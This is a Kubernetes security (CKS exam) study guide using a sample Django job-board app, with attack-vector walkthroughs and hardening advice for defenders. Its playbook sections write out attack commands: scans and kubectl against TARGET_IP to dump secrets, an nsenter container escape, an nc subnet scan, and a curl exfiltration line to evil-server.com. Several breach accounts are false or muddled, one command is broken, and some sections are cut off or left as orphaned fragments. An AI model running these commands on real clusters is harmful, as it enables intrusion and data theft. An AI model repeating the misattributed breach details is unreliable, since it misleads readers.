Understanding "Why" Is Critical on the CKS Exam

The CKS is a performance-based exam (2 hours, ~15-20 hands-on tasks in a live terminal). Unlike multiple-choice exams, every question requires you to configure security controls — not just identify them. Understanding why each control matters helps you reason through unfamiliar scenarios:

  • Defense in Depth — The CKS tests your ability to LAYER controls. If one fails, the next must hold. Always think: "What's my backup?"
  • Least Privilege — Every RBAC question tests whether you grant ONLY what's needed. Over-permission = lost points.
  • Assume Breach — The CKS assumes attackers are already trying. Your job is to detect and stop them before they reach data.
  • Verification — The exam GRADES on verification. After every configuration, run a check command to prove it works.

1.1 Why Kubernetes Security Is Different

Imagine your anihpj/jobpost Django application is running on Kubernetes. Employers post jobs, candidates browse listings, and user data flows through your cluster. Now imagine an attacker finds a way in. How many layers do they have to breach before they reach your database?

📖 Key Concept: The K8s Attack Surface

Attack surface is the sum of all points where an attacker can try to enter or extract data. Kubernetes has a uniquely large attack surface because it manages networking, storage, secrets, identities, and application lifecycle — all through a single API. As a CKS specialist, your job is to reduce, monitor, and defend every inch of that surface.

5 Inconvenient Truths About Default Kubernetes Security

Out of the box, a freshly installed Kubernetes cluster is insecure by default. Knowing these defaults is essential — because every CKS exam question is essentially asking you to fix one of them:

🔴
Truth 1: All Pods Can Talk to Each Other

No NetworkPolicy exists by default. Any pod in any namespace can reach any other pod on any port. This means a compromised jobpost container could directly connect to your PostgreSQL database — no firewall, no barrier, nothing. CKS Fix: Chapter 6 — Network Policies.

🔴
Truth 2: Containers Run as Root (UID 0)

Unless you explicitly set runAsNonRoot: true and runAsUser, every container runs with full root privileges. If an attacker exploits a CVE in your app, they get root on the container — and potentially the node. CKS Fix: Chapter 18 — Security Contexts.

🔴
Truth 3: All 38+ Linux Capabilities Are Enabled

Default containers have SYS_ADMIN, NET_RAW, SYS_PTRACE, and dozens more. Each capability is a potential privilege escalation path. You must explicitly drop: [ALL] and add back only what's needed. CKS Fix: Chapter 18 — capabilities drop ALL.

🔴
Truth 4: Secrets Are Stored as Plain Base64 in etcd

kubectl create secret stores your database passwords, API keys, and TLS certificates as base64-encoded text — not encrypted. Anyone with etcd access can decode them. Encryption at rest must be explicitly configured. CKS Fix: Chapter 19 — EncryptionConfiguration.

🔴
Truth 5: No Audit Logging by Default

By default, Kubernetes records ZERO information about who did what. If an attacker deletes your production namespace at 3 AM, you'll have no record of who, how, or when. Audit logging must be explicitly enabled and configured. CKS Fix: Chapter 28 — Audit Logging.

🏙️ Think of Your K8s Cluster as a City — and Security as Infrastructure
  • 🏛️ Control Plane = City Hall — If someone breaks in, they control everything. Lock every door and window (API server hardening).
  • 🏘️ Worker Nodes = Residential blocks — Your apps live here. Each home needs its own lock (SecurityContext, seccomp).
  • 🌐 Network = Roads — By default, every building has a door to every other building. Install gates between districts (NetworkPolicy).
  • 📦 Containers = Delivery packages — Anyone can send one. Scan every package before accepting it (image scanning, admission control).
  • 🦅 Falco = CCTV cameras on every street — You'll know the moment something suspicious happens.
  • 📋 Audit Logs = Visitor registry — Every entry and exit is recorded forever.
⚠️ Real-World Kubernetes Security Breaches

These are not hypothetical. Major companies have suffered K8s security incidents:

  • Tesla (2018) — Crypto-mining malware deployed via an exposed Kubernetes dashboard with no authentication. Attackers used Tesla's cloud resources to mine cryptocurrency.
  • Capital One (2019) — A misconfigured WAF allowed an attacker to access AWS credentials from a K8s pod, leading to the exposure of 100+ million customer records.
  • Shopify (2020) — Rogue employees accessed customer data through overly permissive K8s RBAC roles that had not been properly scoped.

Common thread in ALL K8s breaches: Default configurations left unchanged, excessive permissions, and no runtime detection. Everything you will learn in this guide directly prevents these exact scenarios.

1.2 The 4Cs of Cloud Native Security (The Layered Model)

The Cloud Native Computing Foundation (CNCF) defines a four-layer security model for cloud-native applications. Each layer builds on the security of the layer below it. If the Cloud layer is insecure, nothing above it matters. Every layer must be independently secured. This model — Cloud → Cluster → Container → Code — is the foundation of every CKS exam question.

The Container is inside the cluster (how your app runs). The Code is the innermost doll (your actual application). A breach at any outer layer compromises ALL inner layers.

What Happens When Each 4C Layer Fails — A Failure Walkthrough

Understanding what each layer protects against is one thing. Understanding what happens when a layer FAILS is what separates CKS-certified specialists from everyone else. Here's what actually happens at each failure point for anihpj:

☁️
When the CLOUD Layer Fails...

If your node's IAM role has AdministratorAccess and an attacker compromises that node, they can delete every S3 bucket, terminate every EC2 instance, and exfiltrate every RDS snapshot. The fix must happen at the cloud provider level — Kubernetes cannot protect you from overly permissive cloud IAM. This is why NodeRestriction exists: it limits what each kubelet can modify via the API server, creating a boundary between node compromise and cluster-wide disaster.

☸️
When the CLUSTER Layer Fails...

If anonymous auth is enabled (--anonymous-auth=true), anyone who can reach your API server on port 6443 has full cluster access — no credentials needed. They can kubectl get secrets --all-namespaces and extract every database password, API key, and TLS certificate stored in your cluster. This is the #1 most common K8s breach vector (see: Tesla 2018). The fix is simple but critical: --anonymous-auth=false and proper RBAC with least privilege.

📦
When the CONTAINER Layer Fails...

If your container runs as root (the default!) and a vulnerability exists in any library (e.g., CVE in Pillow, Requests, or even libc), an attacker who exploits that CVE immediately has root inside the container. From there, they can install backdoors, read /proc/1/environ for secrets, attempt container escape via nsenter, or write to any mounted hostPath volumes. This is why non-root + drop ALL + readOnlyRootFS is mandatory for every production pod.

💻
When the CODE Layer Fails...

If your CI/CD pipeline builds from python:3.11 (a 1GB+ image with compilers, curl, wget, and hundreds of unnecessary packages), every CVE in those packages becomes YOUR CVE. An attacker who exploits a curl vulnerability in your base image can make outbound connections to exfiltrate data — even if your APPLICATION code is perfectly secure. The fix: multi-stage builds, distroless images, and Trivy scanning at every CI/CD stage.

⚠️ The Most Dangerous Assumption in Kubernetes Security

Many administrators assume: "I deployed on a managed K8s service (EKS/GKE/AKS), so the cloud provider handles security." This is dangerously wrong. Managed K8s secures the CONTROL PLANE (API server, etcd, controller manager). It does NOT secure: your pod configurations, your NetworkPolicies, your RBAC rules, your container images, your node OS, your audit logging, or your runtime detection. Everything from the container level down is YOUR responsibility. The CKS exam tests exactly this boundary.

1.3 Security Principles You Will Apply Throughout This Guide

Every single CKS exam task — and every real-world security decision — flows from five core security principles. These are not just theory. They are the mindset you will apply to every kubectl command, every YAML file, and every security audit you perform on the anihpj/jobpost application.

The 5 Core Security Principles

🎯
Least Privilege

Grant ONLY what is needed. Nothing more, nothing less. Every RBAC role, every ServiceAccount, every IAM policy — start from zero and add only what's required.

🧅
Defense in Depth

Multiple layers of security; no single point of failure. If NetworkPolicy fails, SecurityContext still blocks. If Seccomp fails, Falco still alerts. Every layer is a backup.

🚫
Zero Trust

Trust no pod, user, or service by default. Every connection must be explicitly allowed. Default-deny is the starting position for every NetworkPolicy and every RBAC rule.

🧊
Immutability

Containers should not change once running. readOnlyRootFilesystem: true. Changes go through Git → CI/CD → image rebuild → new pod. Attackers cannot persist changes.

📋
Audit Everything

Log every API call, every access, and every anomaly. If you don't know it happened, you can't respond to it. Audit logs + Falco = complete visibility.

Principle Anti-Patterns — What NOT to Do (And What to Do Instead)

Understanding the principles is important. Avoiding the common anti-patterns is what saves you on exam day. Here are the five most dangerous security anti-patterns, with concrete code examples showing wrong vs right approaches:

❌ ANTI-PATTERN: Over-Permissive RBAC

kubectl create clusterrole anihpj-admin --verb=* --resource=*

Granting wildcard permissions defeats the purpose of RBAC entirely. A compromised pod with this role can delete every resource in every namespace.

✅ CORRECT: Least Privilege RBAC

kubectl create role anihpj-reader --verb=get,list --resource=pods,deployments -n anihpj-prod

Grant ONLY the specific verbs and resources needed. Use namespaced Roles (not ClusterRoles) when possible. Always verify with kubectl auth can-i --as=sa.

❌ ANTI-PATTERN: Running as Root

containers:
- name: anihpj
image: anihpj:latest
(no securityContext — runs as root by default!)

✅ CORRECT: Non-Root with Drop ALL

securityContext:
runAsNonRoot: true
runAsUser: 1000
capabilities:
drop: [ALL]
readOnlyRootFilesystem: true

❌ ANTI-PATTERN: Trusting Internal Traffic

No NetworkPolicy defined. All pods in all namespaces can reach anihpj on every port. PostgreSQL port 5432 is exposed to every container in the cluster.

✅ CORRECT: Zero-Trust NetworkPolicy

podSelector: app=anihpj
policyTypes: [Ingress, Egress]
ingress: [{from: [podSelector: app=ingress-nginx], ports: [8000]}]
egress: [{to: [podSelector: app=postgres], ports: [5432]}]
Everything else is implicitly denied.

💡 The CKS Exam Anti-Pattern Rule

On the CKS exam, if you find yourself typing * (wildcard) in an RBAC rule, you're probably losing points. If you leave runAsUser unspecified, you're losing points. If you don't verify after every configuration with a test command, you're losing points. The exam rewards precision, not speed.

🚫 Common Misconceptions About Kubernetes Security

Before you continue to Chapter 2, let's clear up the most common misconceptions that trip up CKS candidates:

  • ❌ "My cluster is behind a firewall, so it's secure."
    ✅ Firewalls protect north-south traffic (external ↔ cluster). They do NOTHING for east-west traffic (pod ↔ pod). A compromised pod can attack every other pod unless you have NetworkPolicies. Chapters 6, 20.
  • ❌ "I use RBAC, so my cluster is locked down."
    ✅ RBAC controls API access (who can run kubectl). It does NOT control what containers can do at runtime (run as root, access host filesystem, make syscalls). You need SecurityContext + Seccomp + AppArmor for that. Chapters 14-18.
  • ❌ "My images are scanned, so my supply chain is secure."
    ✅ Scanning finds KNOWN vulnerabilities. It does NOT prevent someone from pushing a malicious image to your registry. You need image signing (cosign) + admission control (OPA/Kyverno) to verify provenance. Chapters 23-26.
  • ❌ "Security is a one-time setup."
    ✅ New CVEs are discovered daily. New attack techniques emerge constantly. Security is continuous: scan continuously, monitor continuously, update continuously. Chapters 28-35.
  • ❌ "I'll just secure it before the exam."
    ✅ The CKS is a PERFORMANCE exam. You can't memorize your way through it. You need muscle memory: writing YAML from scratch, running kubectl commands blind, and troubleshooting broken clusters under time pressure. Practice, practice, practice.

2.1 How Kubernetes Gets Attacked — The Attack Surface

The Kubernetes attack surface is massive. Unlike a traditional server with one entry point (SSH), a K8s cluster has the API server, the kubelet on every node, the etcd database, the container runtime, the network overlay, and hundreds of pods — each a potential entry point. Here are the seven most common attack vectors, ranked by real-world frequency:

The 7 Most Common Kubernetes Attack Vectors

1️⃣
Exposed API Server (No Authentication)

The API server listens on port 6443. If --anonymous-auth=true (the default!), anyone who can reach that port has full cluster access. This is how Tesla was breached in 2018. Attackers scan the internet for open K8s API ports using Shodan and Masscan. Fix: Chapter 8.

2️⃣
Misconfigured RBAC — Over-Permission

Developers get cluster-admin "to make things easier." ServiceAccounts default to full namespace access. A single compromised credential gives attackers the keys to the kingdom. Fix: Chapter 9.

3️⃣
Vulnerable Container Images — Known CVEs

The average container image contains 100+ known vulnerabilities. If you deploy python:3.9 without scanning, you're shipping CVEs directly into production. Attackers exploit known CVEs in frameworks like Django, Flask, or even the base OS packages. Fix: Chapter 23.

4️⃣
Secrets in Plaintext — Environment Variables & Git

Database passwords in configmap.yaml. API keys in .env files committed to Git. ServiceAccount tokens mounted in every pod by default. A single kubectl describe pod or a Git history search reveals everything. Fix: Chapters 10, 19, 20.

5️⃣
Privilege Escalation — Root Containers

Containers run as root by default. If an attacker exploits any application vulnerability, they immediately have root inside the container. From there: container escape, node compromise, cluster takeover. Fix: Chapters 14, 15, 18.

6️⃣
Lateral Movement — Flat Network

No NetworkPolicies = every pod can reach every other pod on every port. One compromised pod gives attackers access to your database, your cache, your message queue, and every other service in the cluster. Fix: Chapter 6.

7️⃣
Supply Chain — Malicious Images

Pulling images from docker.io/random-user/app without verification. No image signing. No registry allowlist. Attackers publish typosquatted images with backdoors. Fix: Chapters 24, 26, 27.

Era 1 (2018) — Exposed Dashboards: The simplest attack. Kubernetes Dashboard shipped with --enable-skip-login and cluster-admin privileges by default in many distributions. Attackers used Shodan (the "Google for internet-connected devices") to find port 6443 or 8001, and walked straight in. No exploit needed — just a browser. The Tesla breach proved that Fortune 500 companies were running clusters with zero authentication. CKS response: Chapters 5 (Dashboard auth), 8 (API server hardening), and 9 (RBAC) directly address this era.

Era 2 (2019) — Cloud Metadata SSRF: As organizations moved Kubernetes to the cloud, a new attack surface emerged: the cloud provider's metadata API at 169.254.169.254. Every pod on every EC2 node can reach this IP by default. If any pod has a Server-Side Request Forgery vulnerability, the attacker can steal the IAM role credentials attached to the underlying node. This is not a Kubernetes vulnerability — it's an architectural blind spot where cloud and container meet. Capital One's $270 million breach was this exact pattern. CKS response: Chapters 13 (metadata concealment), 16 (IAM minimization), and 6 (NetworkPolicy egress) close this gap.

Era 3 (2020) — Supply Chain Compromise: Attackers realized they didn't need to breach running clusters — they could compromise the software before it ever reached the cluster. By infiltrating build pipelines (CI/CD systems, source repositories, base image registries), attackers injected malicious code that was then signed and distributed as trusted software. SolarWinds demonstrated that even digitally signed software from a reputable vendor could be trojanized if the build system itself was compromised. CKS response: Chapters 25 (static analysis), 26 (cosign/image signing with key management), and 27 (SBOM + SLSA provenance) create a verifiable chain of trust from source to runtime.

Era 4 (2022+) — AI-Assisted Attacks: The latest evolution. Attackers now use large language models to analyze Kubernetes manifests for misconfigurations, generate context-aware exploit code, and plan multi-stage lateral movement campaigns automatically. A single misconfigured RBAC rule that might have taken a human attacker weeks to find can now be identified by an LLM in seconds. The defense must now be equally automated: policy-as-code (OPA/Gatekeeper), automated vulnerability scanning (Trivy), and runtime anomaly detection (Falco) are no longer optional — they are baseline requirements. CKS response: Chapters 24 (admission control), 23 (image scanning), 29 (Falco), and 32 (continuous compliance) build the automated defense layer.

How Attackers Actually Execute Each Vector — Technical Breakdown

Understanding the theory is not enough. Here's exactly what commands attackers run, what they look for, and how each attack succeeds on a default cluster:

Vector 1 — Exposed API Server: The Attacker's Playbook
  # Step 1: Attacker scans for open K8s API ports
  $ shodan search 'product:"kubernetes"' --fields ip_str,port
  $ masscan -p6443 0.0.0.0/0 --rate=10000

  # Step 2: If --anonymous-auth=true (DEFAULT!):
  $ curl -k https://TARGET_IP:6443/api/v1/namespaces
  → Returns ALL namespaces. No credentials needed.

  # Step 3: Extract everything
  $ kubectl --server=https://TARGET_IP:6443 --insecure-skip-tls-verify \
      get pods --all-namespaces
  $ kubectl --server=https://TARGET_IP:6443 --insecure-skip-tls-verify \
      get secrets --all-namespaces
  → Every database password, API key, and TLS cert is now visible.

  # This is EXACTLY what happened to Tesla in 2018.
Vector 3 — Root Container Exploitation: What Root Actually Means
  # Default container (NO securityContext)
  $ kubectl exec -it anihpj-pod -- id
  uid=0(root) gid=0(root) groups=0(root)
  → Container runs as ROOT. Full privileges inside the container.

  # Attacker exploits CVE in Pillow library → gains shell as root
  $ whoami
  root

  # From root inside container:
  $ cat /proc/1/environ | tr '\0' '\n'  # Read ALL environment variables
  $ mount | grep hostPath               # Find host filesystem mounts
  $ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
  → Container escape! Now you're root on the NODE.

  # From node root:
  $ docker ps                           # See ALL containers on this node
  $ crictl ps                           # See ALL containers via CRI
  $ cat /etc/kubernetes/manifests/kube-apiserver.yaml
  → Control plane manifests visible. Cluster completely compromised.

  # CKS FIX: SecurityContext (Ch 18) + Seccomp (Ch 15) + AppArmor (Ch 14)
Vector 6 — Lateral Movement: The Flat Network Problem
  # Attacker compromises anihpj pod. Now they scan the internal network:
  $ for ip in 10.0.0.{1..254}; do nc -zv $ip 5432 2>&1 | grep succeeded; done
  → Found postgres at 10.0.1.45:5432!

  $ for ip in 10.0.0.{1..254}; do nc -zv $ip 6379 2>&1 | grep succeeded; done
  → Found redis at 10.0.2.12:6379!

  # Attacker now has:
  # - Direct access to your production database
  # - Direct access to your session cache
  # - Can reach pods in OTHER namespaces (kube-system, monitoring, etc.)
  # - Zero barriers. The network is completely flat.

  # CKS FIX: Default-deny NetworkPolicy (Ch 6) blocks ALL of this.
  # With NetworkPolicy: nc to postgres → connection REFUSED.

🔴 This is the most important breach to understand for CKS — it combined misconfigured cloud metadata, excessive IAM permissions, and container escape
Capital One 2019: Attack Chain Deconstructed
  STEP 1: Server-Side Request Forgery (SSRF)
  ─────────────────────────────────────────
  Capital One used a WAF (ModSecurity) in front of a web application running on EC2.
  A misconfigured ModSecurity rule allowed an attacker to redirect the WAF's internal
  HTTP request to a target they controlled.

  The WAF's internal proxy fetched: http://169.254.169.254/latest/meta-data/
  → The EC2 Instance Metadata Service! This endpoint returns everything about
    the EC2 instance, including temporary IAM credentials.

  WHY THIS MATTERS FOR KUBERNETES:
  Every pod on an EC2-based K8s node can reach 169.254.169.254 by default.
  If ANY pod has an SSRF vulnerability, and the node has an IAM role attached,
  the attacker can steal those credentials just like Capital One.

  STEP 2: IAM Role Credential Theft
  ──────────────────────────────────

The Attacker's Decision Flow — How They Choose Targets

Attackers don't randomly attack clusters — they follow a predictable, repeatable decision pattern. Understanding this flow is one of the most valuable mental models in the CKS curriculum because it lets you anticipate the attacker's next move and place your defenses exactly where they will be encountered. Each step in the flow corresponds to a specific MITRE ATT&CK tactic and a specific CKS defense chapter.

Step 1 — Scan: The attacker starts with reconnaissance. They use tools like Shodan, Masscan, or even simple curl scripts to find Kubernetes API servers exposed on the internet. They look for port 6443 (the secure API port) and port 8001 (the insecure read-only port, often left open). They also scan for Kubernetes Dashboard at common paths like /api/v1/namespaces/kubernetes-dashboard. If your API server has --anonymous-auth=true (the default!), the scan alone gives them full cluster access. Defense: Network firewalls, API server flags (Ch 8), and never exposing the dashboard without OIDC authentication (Ch 5).

Step 2 — Access: Once a cluster is found, the attacker attempts authentication. If anonymous auth is enabled, no credentials are needed — they are already in. Otherwise, they try stolen kubeconfig files (often found in public GitHub repositories), default ServiceAccount tokens, or brute-force attacks against weak RBAC configurations. A common mistake: giving the default ServiceAccount in every namespace cluster-wide read access "to make development easier." Defense: RBAC with least privilege (Ch 9), disable automount of ServiceAccount tokens on pods that don't need API access (Ch 10), and OIDC integration (Ch 5).

Step 3 — Map: With access established, the attacker runs reconnaissance commands: kubectl get pods --all-namespaces, kubectl get secrets, kubectl get nodes -o wide. In minutes, they have a complete map of your infrastructure — every application, every database, every secret name, every node IP. This is why RBAC must be namespace-scoped; if the attacker's credential only has access to the anihpj namespace, they cannot enumerate the rest of your cluster. Defense: Namespace-scoped RBAC (Ch 9), NodeRestriction admission plugin (Ch 11).

Step 4 — Steal: The attacker extracts credentials. In a default cluster, this is trivial: kubectl get secret anihpj-secrets -o yaml followed by echo "" | base64 -d. In seconds they have your database password, Django SECRET_KEY, API tokens, and TLS private keys. If the pod's ServiceAccount token is mounted (which it is by default), they also have a valid JWT that can be used to make authenticated API calls. Defense: Encryption at rest for Secrets (Ch 19), external secret stores like Vault (Ch 20), and automountServiceAccountToken: false (Ch 10).

Step 5 — Move: The attacker pivots laterally. Without NetworkPolicies, the compromised anihpj pod can reach the PostgreSQL pod on port 5432, the Redis pod on port 6379, and any other service in the cluster. They can also attempt to reach pods in kube-system to compromise control plane components. Defense: Default-deny NetworkPolicy with explicit allow rules (Ch 6), namespace isolation, and mTLS via service mesh (Ch 22).

Step 6 — Exfiltrate: The attacker needs to get data out. If egress NetworkPolicies are not in place, they can simply curl -X POST https://evil-server.com/upload --data @stolen_data.sql. Even if HTTP egress is blocked, sophisticated attackers use DNS tunneling: encoding data into DNS query subdomains that are forwarded to an attacker-controlled DNS server. Defense: Egress NetworkPolicy (Ch 6), AppArmor profiles restricting network access (Ch 14), and Falco rules detecting anomalous outbound connections (Ch 29).

    on that node, access cloud metadata (169.254.169.254), deploy
    crypto-miners, establish persistent node access.
    BLAST RADIUS: THE NODE AND ALL PODS ON IT. From there, lateral
    movement to other nodes is possible.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ runAsNonRoot: true (Ch 18) — even if app is exploited, no root
    ✅ Seccomp profile (Ch 15) — blocks dangerous syscalls like nsenter
    ✅ AppArmor profile (Ch 14) — blocks file/network paths
    ✅ readOnlyRootFilesystem (Ch 18) — attacker cannot write tools
    ✅ drop ALL capabilities (Ch 18) — no CAP_SYS_ADMIN, no escape
    ✅ PodSecurity: Restricted (Ch 17) — enforces all of the above

  COMPONENT: CNI / kube-proxy
  ───────────────────────────
  IF COMPROMISED (no NetworkPolicy — flat network):
    Attacker can: from one compromised pod, reach every other pod,
    every database, every cache, every message queue, pods in kube-system
    that have cluster-admin ServiceAccounts.
    BLAST RADIUS: EVERY POD IN THE CLUSTER reachable from the compromised
    pod. With no NetworkPolicies, this is ALL pods.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ Default-deny NetworkPolicy (Ch 6) — blocks all pod-to-pod traffic
    ✅ Explicit allow rules — only whitelisted pod-to-pod communication
    ✅ Egress NetworkPolicy (Ch 6) — block data exfiltration

       unauthorized pods cannot authenticate to services

Real anihpj Example: Applying the 5-Layer Defense Model

Let's trace what happens to a single kubectl apply -f anihpj-deployment.yaml through all 5 layers. This is not theoretical — this is exactly what you will configure in later chapters, and it is exactly what the CKS exam tests:

❌ anihpj WITHOUT Defense-in-Depth
  • Layer 1 (Edge): Dashboard on public internet, no TLS on Ingress, anyone with the URL can access
  • Layer 2 (API): Default ServiceAccount has cluster-admin, no RBAC restrictions, anonymous auth enabled
  • Layer 3 (Network): No NetworkPolicies. Every pod can reach every other pod on every port. anihpj pod can connect directly to postgres, redis, and kube-system pods.
  • Layer 4 (Container): anihpj runs as root, no Seccomp, no AppArmor, writable filesystem, all capabilities. One RCE in Django = full container + node escape.
  • Layer 5 (Data): SECRET_KEY and DATABASE_URL in plaintext Secret (base64 only). etcd stores them unencrypted. Anyone with etcd access reads everything.

RESULT: One vulnerability in any layer = total cluster compromise.

✅ anihpj WITH Defense-in-Depth (CKS)
  • Layer 1 (Edge): Ingress with TLS termination, WAF in front, Dashboard requires OIDC authentication (Ch 5, 7)
  • Layer 2 (API): RBAC: anihpj SA can only create pods in "anihpj" namespace. Anonymous auth disabled. Audit logging records all API calls. (Ch 8, 9, 28)
  • Layer 3 (Network): Default-deny NetworkPolicy. Explicit allow: anihpj→postgres:5432, ingress→anihpj:8000. Nothing else. (Ch 6)
  • Layer 4 (Container): Non-root user (uid 1000), Seccomp profile (50 syscalls, not 300+), AppArmor profile (only /app writable), readOnlyRootFS, drop ALL capabilities. (Ch 14, 15, 18)
  • Layer 5 (Data): Secrets encrypted at rest in etcd (AES-256). Vault injects DB credentials at runtime — they never touch etcd at all. (Ch 19, 20)

RESULT: Attacker must breach 5 independent layers. Failure at any layer is contained. 5 failures needed for total compromise.

💡 CKS Exam Insight: The Component Question

When you face a CKS task, silently ask: "Which component enforces this?" If the task says "encrypt secrets," the component is etcd. If the task says "restrict syscalls," the component is the container runtime. If the task says "block pods from a namespace," the component is the API server (via admission control). This one question — "Which component?" — guides you to the right configuration file, the right flags, and the right YAML. Master this component map and you master the exam.

3.2 Authentication vs Authorization vs Admission Control

Every API request to Kubernetes passes through three sequential security gates before it is persisted to etcd. Understanding the difference between these three stages — and the order in which they execute — is essential for the CKS exam. If you confuse authorization with admission control (a common mistake), you will configure the wrong component and the exam task will fail.

📖 Three Gates, Three Questions, Three Answers

Authentication (AuthN): "Who are you?" — Verifies identity via certificates, tokens, or OIDC. Authorization (AuthZ): "What can you do?" — Checks RBAC policies against the authenticated identity. Admission Control: "Is this request allowed?" — Validates and mutates the request before it is persisted. All three must pass. If any one fails, the request is rejected with an HTTP error code.

Why the Order Matters — A CKS Exam Scenario

😰 Scenario: What Happens When You Get the Order Wrong

Imagine you set up an OPA policy that blocks pods with hostPath mounts. But you also configure RBAC to deny all users the ability to create pods. A user submits a pod YAML with a hostPath mount. What happens?

Answer: The request fails at Gate 2 (Authorization) with 403 Forbidden — the OPA policy at Gate 3 is never even checked. The user sees "Forbidden" — not "Policy violation: hostPath not allowed." Without understanding the order, you might waste hours debugging why your admission policy "isn't working" when in fact RBAC is blocking the request first.

CKS Lesson: Always check Gate 1 first, then Gate 2, then Gate 3. If a security control isn't working, ask "which gate am I at, and is an earlier gate blocking the request?"

⚠️ The Order Is Fixed — You Cannot Change It

The Authentication → Authorization → Admission Control pipeline is hardcoded into the API server. You cannot reorder it. You cannot skip a gate (well, you can disable admission plugins, but you cannot skip AuthN or AuthZ — though you can set them to "AlwaysAllow" which is effectively skipping them, and that's exactly what the CKS exam tests you on fixing). The exam will give you a cluster where one gate is misconfigured and ask you to fix it. Identifying WHICH gate is broken is the first step.

Deep Dive: Authentication Methods — How Each One Works

The CKS exam expects you to understand not just that authentication exists, but how each method works at the protocol level — because the exam tasks require you to configure them. Here is each method, how it works, and when the exam expects you to use it:

X.509 Client Certificates — The Default kubectl Auth Method
  HOW IT WORKS:
  Every kubeconfig file contains a client certificate + private key embedded
  as base64. When kubectl connects, it presents the certificate. The API
  server verifies it against the cluster's CA certificate. The certificate's
  Subject CN (Common Name) becomes the username. The O (Organization) fields
  become the user's groups.

  Example kubeconfig (simplified):
  ┌─────────────────────────────────────────────────────────────┐
  │ users:                                                       │
  │ - name: anihpj-admin                                         │
  │   user:                                                      │
  │     client-certificate-data: LS0tLS1...  ← YOUR identity     │
  │     client-key-data: LS0tLS1...         ← YOUR private key   │
  └─────────────────────────────────────────────────────────────┘

  Why it matters for CKS:
  • This is the DEFAULT authentication method for kubectl
  • The CN= field maps to the username in RBAC RoleBindings
  • The O= field maps to the group — ClusterRoleBindings can target O=
  • Certificate rotation (Ch 12) is about renewing these certs before expiry
  • If someone steals your kubeconfig, they ARE you — no password needed
Bearer Tokens (JWT) — The ServiceAccount Auth Method
  HOW IT WORKS:
  Every pod has a ServiceAccount token (JWT) mounted at:
  /var/run/secrets/kubernetes.io/serviceaccount/token

  This token is sent as an HTTP header: Authorization: Bearer <token>

  The JWT payload identifies the ServiceAccount:
  {
    "iss": "kubernetes/serviceaccount",
    "kubernetes.io/serviceaccount/namespace": "default",
    "kubernetes.io/serviceaccount/service-account.name": "default",
    "sub": "system:serviceaccount:default:default"
  }

  Why it matters for CKS:
  • The token is mounted BY DEFAULT — even if your pod never talks to the API
  • automountServiceAccountToken: false (Ch 10) disables this
  • Bound tokens (--service-account-token-volume-projection) have expiration
  • Legacy tokens are NON-expiring — they are permanent backdoors
  • The CKS exam WILL test you on disabling automount and enabling bound tokens
OIDC (OpenID Connect) — Enterprise Authentication
  HOW IT WORKS:
  1. User authenticates with external IdP (Google, GitHub, Azure AD, Okta)
  2. IdP returns an ID Token (JWT) to the user
  3. User includes ID Token in kubectl requests: --token=<id_token>
  4. API server validates the token against the IdP's public keys
  5. The JWT's "sub" claim becomes the username; "groups" claim → RBAC groups

  API server configuration (Ch 5):
  --oidc-issuer-url=https://accounts.google.com
  --oidc-client-id=anihpj-cluster.apps.googleusercontent.com
  --oidc-username-claim=email
  --oidc-groups-claim=groups

  Why it matters for CKS:
  • This is the ENTERPRISE auth method — used with Dashboards and CI/CD
  • API server flags above are CKS exam material (Ch 5, 8)
  • OIDC enables MFA — user must pass IdP's MFA before getting kubectl access
  • Groups from the IdP (e.g., "k8s-admins", "k8s-developers") map to RBAC
  • Without OIDC, you manage individual certs/tokens — does not scale

RBAC in Practice — The anihpj Example

Let's trace exactly what happens when a developer from the anihpj team tries to deploy a new version. This is the mental model you need for every RBAC question on the exam:

RBAC Walkthrough: kubectl apply anihpj-deploy.yaml
  STEP 1: Authentication (Gate 1)
  ───────────────────────────────
  User "sarah" (developer on anihpj team)
  Authentication: OIDC via Google Workspace
  Her JWT ID Token contains:
    sub: "sarah@anihpj.com"
    groups: ["k8s-developers", "anihpj-team"]

  API server identifies her as: user "sarah@anihpj.com", groups ["k8s-developers","anihpj-team"]


  STEP 2: Authorization — RBAC Lookup (Gate 2)
  ──────────────────────────────────────────────
  She runs: kubectl apply -f anihpj-deployment.yaml

  The API server checks:
  ① Does Sarah have "create deployments" permission in namespace "anihpj"?
  ② RBAC lookup algorithm:
     a. Find all RoleBindings in "anihpj" namespace that reference Sarah
        OR reference a group she belongs to
     b. Find all ClusterRoleBindings that reference Sarah or her groups
     c. Combine all Roles/ClusterRoles found
     d. Check if any of them allow "create" on "deployments" in "anihpj"

  Example RBAC that ALLOWS her:
  ──────────────────────────────
  apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    name: anihpj-developers
    namespace: anihpj               ← Only in anihpj namespace!
  subjects:
  - kind: Group
    name: anihpj-team               ← Sarah's OIDC group
    apiGroup: rbac.authorization.k8s.io
  roleRef:
    kind: ClusterRole
    name: edit                      ← Built-in edit role
    apiGroup: rbac.authorization.k8s.io

  RESULT: Sarah CAN create deployments in anihpj namespace.
  She CANNOT create deployments in "kube-system" or any other namespace.
  She CANNOT read Secrets even in anihpj (edit role does not include secrets).


  STEP 3: Admission Control (Gate 3)
  ──────────────────────────────────
  Her deployment YAML passes RBAC. Now admission controllers check it:
  • PodSecurity: namespace "anihpj" labeled "pod-security.kubernetes.io/enforce: restricted"
  • The deployment's pod spec must meet restricted PSS:
    - Must be non-root
    - No hostPath volumes
    - No privileged containers
    - Must have Seccomp profile
  • OPA/Gatekeeper: custom policy checks image is from anihpj-registry.io/*
  • ImagePolicyWebhook: verifies image signature (cosign)

  If all pass → Deployment created. Pod scheduled. Container starts.

🔧
kube-bench — CIS Benchmark Checker

Purpose: Checks your cluster against the CIS Kubernetes Benchmark — hundreds of security configuration tests covering API server, etcd, kubelet, and worker nodes. 🦅
Falco — Runtime Threat Detection

Purpose: Monitors system calls in real-time to detect anomalous behavior — shell spawns in containers, unexpected network connections, file writes to sensitive paths. When to use: Continuously, as a DaemonSet on every node. CKS Exam: ✅ MUST know — this is one of the most heavily tested tools. 📋
OPA/Gatekeeper — Policy-as-Code

Purpose: Enforces custom security policies at admission time using Rego, a declarative policy language. Gatekeeper wraps OPA with Kubernetes-native CRDs. When to use: As a ValidatingWebhook — every pod creation request is checked against your policies. CKS Exam: ✅ Yes — you must know how to write and deploy OPA policies. Key command: kubectl apply -f constraint-template.yaml && kubectl apply -f constraint.yaml. Example policy: "Reject any pod that runs as root or uses hostPath." Used extensively in Chapter 24.

🔏
